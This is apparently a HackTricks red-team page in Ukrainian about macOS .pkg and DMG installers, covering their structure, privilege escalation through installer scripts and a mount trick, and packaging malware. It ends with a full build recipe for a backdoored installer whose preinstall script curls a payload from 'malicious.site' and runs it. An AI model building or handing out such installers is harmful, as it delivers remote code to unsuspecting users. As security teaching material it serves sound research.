# Зловживання установниками macOS

{% hint style="success" %}
Вивчайте та практикуйте AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Вивчайте та практикуйте GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Підтримайте HackTricks</summary>

* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Діліться хакерськими трюками, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на GitHub.

</details>
{% endhint %}

## Основна інформація про pkg

Установочний пакет macOS (також відомий як файл `.pkg`) — це формат файлу, який використовується macOS для **розповсюдження програмного забезпечення**. Ці файли схожі на **коробку, яка містить все, що потрібно програмному забезпеченню** для правильного встановлення та роботи.

Сам файл пакета є архівом, який містить **ієрархію файлів і каталогів, які будуть встановлені на цільовому** комп'ютері. Він також може включати **скрипти** для виконання завдань до та після встановлення, такі як налаштування конфігураційних файлів або очищення старих версій програмного забезпечення.

### Ієрархія

<figure><img src="../../../.gitbook/assets/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

* **Розповсюдження (xml)**: Налаштування (назва, текст привітання…) та перевірки скриптів/встановлення
* **PackageInfo (xml)**: Інформація, вимоги до встановлення, місце встановлення, шляхи до скриптів для виконання
* **Рахунок матеріалів (bom)**: Список файлів для встановлення, оновлення або видалення з правами доступу до файлів
* **Payload (архів CPIO, стиснутий gzip)**: Файли для встановлення в `install-location` з PackageInfo
* **Скрипти (архів CPIO, стиснутий gzip)**: Скрипти перед і після встановлення та інші ресурси, витягнуті в тимчасовий каталог для виконання.

### Розпакування
```bash
# Tool to directly get the files inside a package
pkgutil —expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files ina. more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
Щоб візуалізувати вміст інсталятора без ручного розпакування, ви також можете використовувати безкоштовний інструмент [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/).

## Основна інформація про DMG

Файли DMG, або образи дисків Apple, є форматом файлів, який використовується macOS для образів дисків. Файл DMG по суті є **монтуємим образом диска** (він містить власну файлову систему), що містить сирі блоки даних, які зазвичай стиснуті і іноді зашифровані. Коли ви відкриваєте файл DMG, macOS **монтує його так, ніби це фізичний диск**, що дозволяє вам отримати доступ до його вмісту.

{% hint style="danger" %}
Зверніть увагу, що **`.dmg`** інсталятора підтримують **так багато форматів**, що в минулому деякі з них, що містили вразливості, були зловживані для отримання **виконання коду ядра**.
{% endhint %}

### Ієрархія

<figure><img src="../../../.gitbook/assets/image (225).png" alt=""><figcaption></figcaption></figure>

Ієрархія файлу DMG може бути різною в залежності від вмісту. Однак для DMG додатків вона зазвичай має таку структуру:

* Верхній рівень: Це корінь образу диска. Він часто містить додаток і, можливо, посилання на папку Додатки.
* Додаток (.app): Це фактичний додаток. У macOS додаток зазвичай є пакетом, що містить багато окремих файлів і папок, які складають додаток.
* Посилання на Додатки: Це ярлик до папки Додатки в macOS. Мета цього полягає в тому, щоб спростити установку додатка. Ви можете перетягнути файл .app на цей ярлик, щоб встановити додаток.

## Підвищення привілеїв через зловживання pkg

### Виконання з публічних директорій

Якщо скрипт перед або після установки, наприклад, виконується з **`/var/tmp/Installerutil`**, і зловмисник може контролювати цей скрипт, він може підвищити привілеї щоразу, коли його виконують. Або інший подібний приклад:

<figure><img src="../../../.gitbook/assets/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

Це [публічна функція](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg), яку кілька інсталяторів і оновлювачів викликають для **виконання чогось від імені root**. Ця функція приймає **шлях** до **файлу**, який потрібно **виконати** як параметр, однак, якщо зловмисник може **модифікувати** цей файл, він зможе **зловживати** його виконанням з root для **підвищення привілеїв**.
```bash
# Breakpoint in the function to check wich file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this missconfig
```
Для отримання додаткової інформації перегляньте цю доповідь: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)

### Виконання через монтування

Якщо інсталятор записує в `/tmp/fixedname/bla/bla`, можливо **створити монтування** над `/tmp/fixedname` без власників, щоб ви могли **модифікувати будь-який файл під час установки** для зловживання процесом установки.

Прикладом цього є **CVE-2021-26089**, який зміг **перезаписати періодичний скрипт** для отримання виконання як root. Для отримання додаткової інформації перегляньте доповідь: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)

## pkg як шкідливе ПЗ

### Порожній вантаж

Можливо просто згенерувати **`.pkg`** файл з **скриптами перед і після установки** без будь-якого реального вантажу, окрім шкідливого ПЗ всередині скриптів.

### JS у файлі distribution xml

Можливо додати **`<script>`** теги у **файл distribution xml** пакета, і цей код буде виконано, і він може **виконувати команди** за допомогою **`system.run`**:

<figure><img src="../../../.gitbook/assets/image (1043).png" alt=""><figcaption></figcaption></figure>

### Інсталятор з бекдором

Зловмисний інсталятор, що використовує скрипт і JS код всередині dist.xml
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options customize="allow" require-scripts="false"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Buil final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## References

* [**DEF CON 27 - Розпакування пакетів: Погляд всередину Macos Installer Packages та загальні вразливості безпеки**](https://www.youtube.com/watch?v=iASSG0\_zobQ)
* [**OBTS v4.0: "Дикий світ macOS Installer" - Тоні Ламберта**](https://www.youtube.com/watch?v=Eow5uNHtmIg)
* [**DEF CON 27 - Розпакування пакетів: Погляд всередину MacOS Installer Packages**](https://www.youtube.com/watch?v=kCXhIYtODBg)
* [https://redteamrecipe.com/macos-red-teaming?utm\_source=pocket\_shared#heading-exploiting-installer-packages](https://redteamrecipe.com/macos-red-teaming?utm\_source=pocket\_shared#heading-exploiting-installer-packages)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
